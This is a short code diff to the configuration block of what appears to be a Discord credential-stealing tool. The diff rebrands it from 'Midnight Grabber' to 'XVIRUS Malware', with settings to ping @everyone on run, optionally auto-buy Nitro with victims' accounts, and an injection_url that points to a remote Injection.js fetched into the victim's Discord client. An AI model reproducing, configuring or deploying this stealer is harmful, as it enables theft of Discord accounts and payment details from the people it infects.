@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Midnight Grabber | https://guns.lol/247msn', 
-  embed_icon: 'https://imgur.com/81575b78-e93d-444c-b60f-c389c3f47573', 
+  embed_name: 'XVIRUS Malware | https://discord.gg/cnJnaZvBYN', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1343268950989078621/1348169625619140659/2Q.png?ex=67ce7c4e&is=67cd2ace&hm=8dad01d03910aa3c5283c15c864b2cef9a60e3c6a6ce5977388ab7e4bf5e5f15&', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/Injection.js', 
 
